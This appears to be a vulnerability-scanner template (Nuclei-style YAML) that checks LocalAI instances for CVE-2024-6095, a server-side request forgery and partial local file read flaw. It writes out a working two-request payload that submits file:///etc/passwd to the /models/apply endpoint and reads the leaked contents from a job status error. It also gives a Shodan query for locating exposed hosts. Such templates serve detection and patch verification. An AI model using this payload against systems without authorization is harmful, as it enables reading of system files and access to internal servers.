flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    json:
    - .uuid
    name: uuid
    part: body
    type: json
  raw:
  - 'POST /models/apply HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"url":"file:///etc/passwd"}

    '
- matchers:
  - part: body
    type: word
    words:
    - ': cannot unmarshal !!str `root:x:...`'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /models/jobs/{{uuid}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6095
info:
  author: iamnoooob,pdresearch,rootxharsh
  classification:
    cpe: cpe:2.3:a:mudler:localai:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-6095
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-918
    epss-percentile: 0.17714
    epss-score: 0.00046
  description: 'A vulnerability in the /models/apply endpoint of mudler/localai versions
    2.15.0 allows for Server-Side Request Forgery (SSRF) and partial Local File Inclusion
    (LFI). The endpoint supports both http(s)-// and file-// schemes, where the latter
    can lead to LFI. However, the output is limited due to the length of the error
    message. This vulnerability can be exploited by an attacker with network access
    to the LocalAI instance, potentially allowing unauthorized access to internal
    HTTP(s) servers and partial reading of local files. The issue is fixed in version
    2.17.

    '
  metadata:
    max-request: 2
    product: localai
    shodan-query: http.favicon.hash:-976853304
    vendor: mudler
    verified: true
  name: LocalAI - Partial Local File Read
  reference:
  - https://github.com/fkie-cad/nvd-json-data-feeds
  - https://github.com/sev-hack/sev-hack
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6095
  severity: medium
  tags: cve,cve2024,localai,mudler,lfi
